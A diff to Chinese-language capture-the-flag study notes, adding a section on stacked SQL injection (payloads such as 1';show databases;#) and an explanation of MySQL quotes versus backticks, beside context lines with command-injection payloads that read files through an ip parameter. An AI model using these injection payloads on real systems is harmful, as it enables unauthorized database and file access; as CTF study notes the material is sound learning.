@@ -252,3 +252,26 @@ ls执行后第一行就是flag.php
 
         ?ip=127.0.0.1;cat 'ls'
         ?ip=127.0.0.1;cat $(ls)
+
+
+4.堆叠注入
+-
+
+```
+1';show databases;#
+1';show tables;#
+```
+
+****
+        mysql中点引号( ' )和反勾号( ` )的区别
+        linux下不区分，windows下区分
+        区别:
+        单引号( ' )或双引号主要用于字符串的引用符号
+        eg：mysql> SELECT 'hello', "hello" ;
+        
+        反勾号( ` )主要用于数据库、表、索引、列和别名用的引用符是[Esc下面的键]
+        eg:`mysql>SELECT * FROM   `table`   WHERE `from` = 'abc' ;
+        输入1'; show columns from `words`; # 字段使用的是反勾号（ ` ）
+****
+
+
